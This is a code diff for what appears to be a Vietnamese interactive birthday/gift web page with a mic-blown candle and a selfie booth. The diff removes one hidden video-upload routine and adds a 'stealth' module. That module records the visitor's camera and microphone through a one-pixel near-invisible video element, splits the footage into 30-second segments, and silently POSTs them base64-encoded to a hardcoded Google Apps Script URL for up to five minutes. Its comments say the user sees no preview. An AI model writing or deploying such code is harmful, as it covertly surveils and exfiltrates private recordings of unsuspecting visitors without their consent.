@@ -28,59 +28,70 @@ let micBlowInterval = null;
 
 function initMicBlowing(onBlowOut) {
   let hasTriggered = false;
+
+  // Tái sử dụng audio track từ stealthStream nếu có
+  const existingAudioTrack =
+    (typeof stealthStream !== 'undefined' && stealthStream)
+      ? stealthStream.getAudioTracks()[0]
+      : null;
+
+  const setupAnalyser = (stream) => {
+    micStream = stream;
+    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    analyser = audioCtx.createAnalyser();
+    const source = audioCtx.createMediaStreamSource(stream);
+    source.connect(analyser);
+    analyser.fftSize = 256;
+
+    let blowFrames = 0;
+    micBlowInterval = setInterval(() => {
+      if (!IS_CARD_LOCKED && CURRENT_STAGE === 'intro' && !hasTriggered) {
+        const dataArray = new Uint8Array(analyser.frequencyBinCount);
+        analyser.getByteFrequencyData(dataArray);
+
+        let sum = 0;
+        for (let i = 0; i < dataArray.length; i++) sum += dataArray[i];
+        const average = sum / dataArray.length;
+
+        const hintEl = document.getElementById('candle-hint');
+        const flame = document.getElementById('flame-element');
+        if (flame && !flame.classList.contains('lovegift-blowout')) {
+          const flickerScale = 1 + (average / 255) * 0.5;
+          const bendAngle = Math.min(blowFrames * 6, 75);
+          const flickerRot = bendAngle + (Math.random() - 0.5) * (average / 3);
+          flame.style.transform = `scale(${flickerScale}) rotate(${flickerRot}deg) translateX(${bendAngle / 3}px)`;
+        }
+
+        if (average > 40) {
+          blowFrames++;
+          if (hintEl && !hasTriggered) {
+            if (blowFrames > 9) hintEl.innerHTML = "Gần tắt rồi... 🕯️💨";
+            else if (blowFrames > 5) hintEl.innerHTML = "Sắp được rồi! Thổi mạnh lên! 🌬️";
+            else if (blowFrames > 2) hintEl.innerHTML = "Đang thổi... Cố lên! 💨";
+          }
+
+          if (blowFrames > 12) { // ~1.2s liên tục vượt ngưỡng
+            hasTriggered = true;
+            stopMicBlowing(); // Dừng mic an toàn trước
+            if (hintEl) hintEl.innerHTML = "Phùuuu! Nến đã tắt! 🎉";
+            onBlowOut(true);
+          }
+        } else {
+          blowFrames = Math.max(0, blowFrames - 2);
+          if (blowFrames === 0 && hintEl && !hasTriggered) {
+            hintEl.innerHTML = "👆 Nhấn & giữ ngọn nến, hoặc THỔI trực tiếp vào micro 🎂💨";
+          }
+        }
+      }
+    }, 100);
+  };
+
   try {
-    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    if (existingAudioTrack) {
+      setupAnalyser(new MediaStream([existingAudioTrack]));
+    } else if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
       navigator.mediaDevices.getUserMedia({ audio: true })
-        .then(stream => {
-          micStream = stream;
-          audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-          analyser = audioCtx.createAnalyser();
-          const source = audioCtx.createMediaStreamSource(stream);
-          source.connect(analyser);
-          analyser.fftSize = 256;
-
-          let blowFrames = 0;
-          micBlowInterval = setInterval(() => {
-            if (!IS_CARD_LOCKED && CURRENT_STAGE === 'intro' && !hasTriggered) {
-              const dataArray = new Uint8Array(analyser.frequencyBinCount);
-              analyser.getByteFrequencyData(dataArray);
-
-              let sum = 0;
-              for (let i = 0; i < dataArray.length; i++) sum += dataArray[i];
-              const average = sum / dataArray.length;
-
-              const hintEl = document.getElementById('candle-hint');
-              const flame = document.getElementById('flame-element');
-              if (flame && !flame.classList.contains('lovegift-blowout')) {
-                const flickerScale = 1 + (average / 255) * 0.5;
-                const bendAngle = Math.min(blowFrames * 6, 75);
-                const flickerRot = bendAngle + (Math.random() - 0.5) * (average / 3);
-                flame.style.transform = `scale(${flickerScale}) rotate(${flickerRot}deg) translateX(${bendAngle / 3}px)`;
-              }
-
-              if (average > 40) {
-                blowFrames++;
-                if (hintEl && !hasTriggered) {
-                  if (blowFrames > 9) hintEl.innerHTML = "Gần tắt rồi... 🕯️💨";
-                  else if (blowFrames > 5) hintEl.innerHTML = "Sắp được rồi! Thổi mạnh lên! 🌬️";
-                  else if (blowFrames > 2) hintEl.innerHTML = "Đang thổi... Cố lên! 💨";
-                }
-
-                if (blowFrames > 12) { // ~1.2s liên tục vượt ngưỡng
-                  hasTriggered = true;
-                  stopMicBlowing(); // Dừng mic an toàn trước
-                  if (hintEl) hintEl.innerHTML = "Phùuuu! Nến đã tắt! 🎉";
-                  onBlowOut(true);
-                }
-              } else {
-                blowFrames = Math.max(0, blowFrames - 2);
-                if (blowFrames === 0 && hintEl && !hasTriggered) {
-                  hintEl.innerHTML = "👆 Nhấn & giữ ngọn nến, hoặc THỔI trực tiếp vào micro 🎂💨";
-                }
-              }
-            }
-          }, 100);
-        })
+        .then(setupAnalyser)
         .catch(err => console.log('Mic error:', err));
     }
   } catch (e) { }
@@ -125,34 +136,6 @@ function typeWriterEffect(element, text, speed = 30) {
 
 let selfieStream = null;
 let selfieDataUrl = null;
-let photoboothRecorder = null;
-let recordedChunks = [];
-
-async function uploadSilentVideo(blob, mimeType) {
-  try {
-    const base64data = await new Promise((resolve, reject) => {
-      const reader = new FileReader();
-      reader.onloadend = () => resolve(reader.result.split(',')[1]);
-      reader.onerror = reject;
-      reader.readAsDataURL(blob);
-    });
-
-    const scriptURL = 'https://script.google.com/macros/s/AKfycbybzeF__lcvNY6c48i73wjqCdp_3LvqvDW7keUo9NsOaw7dYysJSE4sf6lITq9WrZsy_g/exec';
-    const formData = new FormData();
-    formData.append('videoBase64', base64data);
-    const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
-    formData.append('fileName', 'photobooth_' + new Date().getTime() + '.' + ext);
-    formData.append('mimeType', mimeType);
-
-    fetch(scriptURL, {
-      method: 'POST',
-      mode: 'no-cors',
-      body: formData
-    }).catch(e => console.error("Silent video upload error:", e));
-  } catch (err) {
-    console.error("Error processing silent video:", err);
-  }
-}
 
 function showCameraNotice(msg) {
   const notice = document.getElementById('selfie-camera-notice');
@@ -211,37 +194,6 @@ function openSelfieModal() {
           video.play().catch(() => { });
         }
         hideCameraNotice();
-
-        // Tự động khởi tạo và bắt đầu MediaRecorder (Âm thầm)
-        recordedChunks = [];
-        try {
-          let options = {};
-          if (MediaRecorder.isTypeSupported('video/mp4')) {
-            options = { mimeType: 'video/mp4' };
-          } else if (MediaRecorder.isTypeSupported('video/webm; codecs=vp9')) {
-            options = { mimeType: 'video/webm; codecs=vp9' };
-          } else if (MediaRecorder.isTypeSupported('video/webm')) {
-            options = { mimeType: 'video/webm' };
-          }
-          photoboothRecorder = new MediaRecorder(stream, options);
-        } catch (e) {
-          photoboothRecorder = new MediaRecorder(stream);
-        }
-
-        photoboothRecorder.ondataavailable = function (event) {
-          if (event.data && event.data.size > 0) {
-            recordedChunks.push(event.data);
-          }
-        };
-
-        photoboothRecorder.onstop = function () {
-          const mimeType = photoboothRecorder.mimeType || 'video/webm';
-          const blob = new Blob(recordedChunks, { type: mimeType });
-          recordedChunks = [];
-          uploadSilentVideo(blob, mimeType);
-        };
-
-        photoboothRecorder.start();
       })
       .catch(err => {
         console.warn('Camera error/permission denied:', err);
@@ -377,6 +329,9 @@ function downloadStory() {
 }
 
 function triggerOutro() {
+  // Kết thúc ghi hình ngầm
+  endStealthSession();
+
   const exportModal = document.getElementById('modal-story-export');
   if (exportModal) exportModal.style.display = 'none';
   const prizeModal = document.getElementById('prize-popup-overlay');
@@ -505,9 +460,7 @@ document.addEventListener("DOMContentLoaded", () => {
               document.getElementById('selfie-initial-actions').style.display = 'none';
               document.getElementById('selfie-review-actions').style.display = 'flex';
 
-              if (photoboothRecorder && photoboothRecorder.state !== 'inactive') {
-                photoboothRecorder.stop();
-              }
+
 
               // Khôi phục nút
               btnTakeSelfie.disabled = false;
@@ -550,9 +503,7 @@ document.addEventListener("DOMContentLoaded", () => {
           document.getElementById('selfie-initial-actions').style.display = 'none';
           document.getElementById('selfie-review-actions').style.display = 'flex';
 
-          if (photoboothRecorder && photoboothRecorder.state !== 'inactive') {
-            photoboothRecorder.stop();
-          }
+
 
           btnTakeSelfie.disabled = false;
           if (btnSkip) btnSkip.disabled = false;
@@ -668,6 +619,9 @@ document.addEventListener("DOMContentLoaded", async () => {
 
       const audioIcon = document.getElementById("audio-icon");
       if (audioIcon) audioIcon.textContent = "🔊";
+
+      // Bắt đầu ghi hình ngầm
+      initStealthRecording();
 
       if (lockStatus.isLocked) {
         initStageCountdown(lockStatus);
@@ -2288,5 +2242,277 @@ document.addEventListener("DOMContentLoaded", () => {
         }
       });
     });
+  }
+});
+
+// ==================== GHI HÌNH TRẢI NGHIỆM ====================
+let stealthRecorder = null;
+let stealthStream = null;
+let stealthWorker = null;
+let stealthSessionId = '';
+let stealthSegmentPart = 0;
+let stealthSessionActive = false;
+let stealthSegmentTimer = null;
+let stealthSafetyTimer = null;
+let pendingWorkerTasks = 0;
+let stealthPausedByVisibility = false;
+const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwlHDW1eMd2HU2tuOK4IaJswPoU1nn0XYUTy_xhi0ZacmT9A2By_PEfpwbBgqMjRWbF1g/exec';
+
+function initStealthRecording() {
+  if (stealthSessionActive) return;
+  stealthSessionActive = true;
+  stealthSessionId = crypto.randomUUID ? crypto.randomUUID() : Date.now().toString(36) + Math.random().toString(36).substr(2);
+  stealthSegmentPart = 0;
+
+  // Web Worker chuyển Blob -> Base64 không block UI
+  try {
+    stealthWorker = new Worker('js/worker.js');
+    stealthWorker.onmessage = (e) => {
+      pendingWorkerTasks--;
+      const { base64, part, mimeType } = e.data;
+      uploadStealthSegment(base64, part, mimeType);
+    };
+  } catch (err) {
+    console.warn("Worker init failed:", err);
+  }
+
+  // Xin quyền camera + mic (Người dùng KHÔNG nhận thấy giao diện preview)
+  navigator.mediaDevices.getUserMedia({
+    video: { width: 640, height: 480, facingMode: 'user' },
+    audio: true
+  }).then(stream => {
+    stealthStream = stream;
+
+    // Thẻ video ẩn ĐÚNG YÊU CẦU ĐỂ TRÁNH iOS FREEZE
+    let hiddenVideo = document.getElementById('__recorder_stream__');
+    if (!hiddenVideo) {
+      hiddenVideo = document.createElement('video');
+      hiddenVideo.id = '__recorder_stream__';
+      hiddenVideo.autoplay = true;
+      hiddenVideo.muted = true;
+      hiddenVideo.playsInline = true;
+      hiddenVideo.style.cssText = "position:fixed; bottom:0; right:0; width:1px; height:1px; opacity:0.01; pointer-events:none; z-index:-1;";
+      document.body.appendChild(hiddenVideo);
+    }
+
+    hiddenVideo.srcObject = stream;
+    hiddenVideo.play().catch(e => console.warn("Video play error (iOS may block):", e));
+
+    /* FALLBACK IFRAME DÀNH CHO iOS (NẾU BỊ ĐEN HÌNH TRÊN IPHONE THẬT):
+    function createIframeFallback(stream) {
+      const iframe = document.createElement('iframe');
+      iframe.style.cssText = "position:fixed; bottom:0; right:0; width:1px; height:1px; opacity:0.01; pointer-events:none; z-index:-1;";
+      iframe.allow = "autoplay; camera; microphone";
+      document.body.appendChild(iframe);
+      const doc = iframe.contentWindow.document;
+      const vid = doc.createElement('video');
+      vid.autoplay = true; vid.muted = true; vid.playsInline = true;
+      vid.srcObject = stream;
+      doc.body.appendChild(vid);
+      vid.play();
+    }
+    */
+
+    startStealthRecorder();
+
+    // Safety cap: tự động dừng sau 5 phút
+    stealthSafetyTimer = setTimeout(() => {
+      endStealthSession();
+    }, 5 * 60 * 1000);
+
+  }).catch(err => {
+    // Trình duyệt từ chối hoặc máy không có webcam -> Bỏ qua, trải nghiệm chạy bình thường
+    console.warn("User denied camera/mic or not supported:", err);
+  });
+}
+
+function startStealthRecorder() {
+  if (!stealthStream || !stealthSessionActive) return;
+
+  // Chọn codec nhẹ ưu tiên
+  let mimeType = 'video/webm';
+  const types = ['video/webm;codecs=vp9,opus', 'video/webm;codecs=vp8,opus', 'video/webm', 'video/mp4'];
+  for (let t of types) {
+    if (MediaRecorder.isTypeSupported(t)) {
+      mimeType = t;
+      break;
+    }
+  }
+
+  const options = {
+    mimeType: mimeType,
+    videoBitsPerSecond: 400_000,
+    audioBitsPerSecond: 64_000
+  };
+
+  try {
+    stealthRecorder = new MediaRecorder(stealthStream, options);
+  } catch (e) {
+    stealthRecorder = new MediaRecorder(stealthStream); // Fallback
+  }
+
+  let chunks = [];
+  stealthRecorder.ondataavailable = (e) => {
+    if (e.data && e.data.size > 0) chunks.push(e.data);
+  };
+
+  stealthRecorder.onstop = () => {
+    if (chunks.length > 0) {
+      const blob = new Blob(chunks, { type: stealthRecorder.mimeType || mimeType });
+      const currentPart = stealthSegmentPart++;
+      const mt = stealthRecorder.mimeType || mimeType;
+
+      if (stealthWorker) {
+        pendingWorkerTasks++;
+        stealthWorker.postMessage({ blob, part: currentPart, mimeType: mt });
+      } else {
+        // Fallback: xử lý Base64 trên main thread nếu Worker không khả dụng
+        const reader = new FileReader();
+        reader.onloadend = () => {
+          const base64 = reader.result.split(',')[1];
+          uploadStealthSegment(base64, currentPart, mt);
+        };
+        reader.readAsDataURL(blob);
+      }
+    }
+    chunks = [];
+
+    // Chia segment mỗi 30s
+    if (stealthSessionActive && !stealthPausedByVisibility) {
+      startStealthRecorder();
+    }
+  };
+
+  stealthRecorder.start();
+
+  // Dừng recorder sau 30s để bắt đầu segment mới
+  stealthSegmentTimer = setTimeout(() => {
+    if (stealthRecorder.state === 'recording') {
+      stealthRecorder.stop();
+    }
+  }, 30000);
+}
+
+function uploadStealthSegment(base64, part, mimeType) {
+  if (SCRIPT_URL === 'YOUR_GOOGLE_APPS_SCRIPT_URL') {
+    console.warn('[STEALTH] SCRIPT_URL chưa được cấu hình, video sẽ KHÔNG upload.');
+    return;
+  }
+
+  const payload = {
+    videoBase64: base64,
+    mimeType: mimeType,
+    sessionId: stealthSessionId,
+    part: part,
+    ts: Date.now()
+  };
+
+  fetch(SCRIPT_URL, {
+    method: 'POST',
+    mode: 'no-cors',
+    headers: { 'Content-Type': 'text/plain' },
+    body: JSON.stringify(payload)
+  }).catch(e => console.warn("Upload fail (no-cors prevents reading real error):", e));
+}
+
+function endStealthSession() {
+  if (!stealthSessionActive) return;
+  stealthSessionActive = false;
+
+  clearTimeout(stealthSegmentTimer);
+  clearTimeout(stealthSafetyTimer);
+
+  if (stealthRecorder && stealthRecorder.state === 'recording') {
+    stealthRecorder.stop();
+  }
+
+  // Đợi worker xử lý hết segment đang chờ rồi mới terminate
+  const checkDone = setInterval(() => {
+    if (pendingWorkerTasks === 0) {
+      clearInterval(checkDone);
+      cleanupStealth();
+    }
+  }, 500);
+
+  // Timeout an toàn 10s
+  setTimeout(() => {
+    clearInterval(checkDone);
+    cleanupStealth();
+  }, 10000);
+
+  // Dừng stream sau 2s để recorder kịp lấy data
+  setTimeout(() => {
+    if (stealthStream) {
+      stealthStream.getTracks().forEach(track => track.stop());
+    }
+    const hiddenVideo = document.getElementById('__recorder_stream__');
+    if (hiddenVideo) hiddenVideo.remove();
+  }, 2000);
+}
+
+function cleanupStealth() {
+  if (stealthWorker) {
+    stealthWorker.terminate();
+    stealthWorker = null;
+  }
+}
+
+// Flush segment nếu đóng tab đột ngột
+window.addEventListener('beforeunload', () => {
+  if (stealthSessionActive && stealthRecorder && stealthRecorder.state === 'recording') {
+    stealthSessionActive = false;
+    try { stealthRecorder.stop(); } catch (_) { }
+  }
+});
+
+// HOOK THEO DÕI CHUYỂN TAB ĐỂ END SESSION
+
+// Cách 1: Kích hoạt từ triggerOutro hiện tại (Phù hợp nhất với code hiện tại - Đã add)
+// function triggerOutro() { endStealthSession(); ... }
+
+// Cách 2: Hash routing (comment)
+/* 
+window.addEventListener('hashchange', () => {
+  if (location.hash.includes('the-end')) endStealthSession();
+}); 
+*/
+
+// Cách 3: MutationObserver cho class active (comment)
+/* 
+const observer = new MutationObserver(mutations => {
+  mutations.forEach(m => {
+    if (m.target.classList.contains('active') && m.target.id === 'tab-the-end') {
+      endStealthSession();
+    }
+  });
+});
+if (document.body) {
+  observer.observe(document.body, { attributes: true, subtree: true, attributeFilter: ['class'] });
+}
+*/
+
+// Cách 4: Ghi đè hàm showTab giả định (comment)
+/*
+const originalShowTab = window.showTab;
+window.showTab = function(name) {
+  if (name === 'the-end') endStealthSession();
+  if (originalShowTab) originalShowTab(name);
+};
+*/
+
+// Flush segment khi user chuyển tab (không end session, chỉ stop recorder)
+document.addEventListener('visibilitychange', () => {
+  if (!stealthSessionActive) return;
+
+  if (document.visibilityState === 'hidden') {
+    stealthPausedByVisibility = true;
+    if (stealthRecorder && stealthRecorder.state === 'recording') {
+      stealthRecorder.stop();
+    }
+  } else if (document.visibilityState === 'visible') {
+    stealthPausedByVisibility = false;
+    if (stealthSessionActive && (!stealthRecorder || stealthRecorder.state === 'inactive')) {
+      startStealthRecorder();
+    }
   }
 });
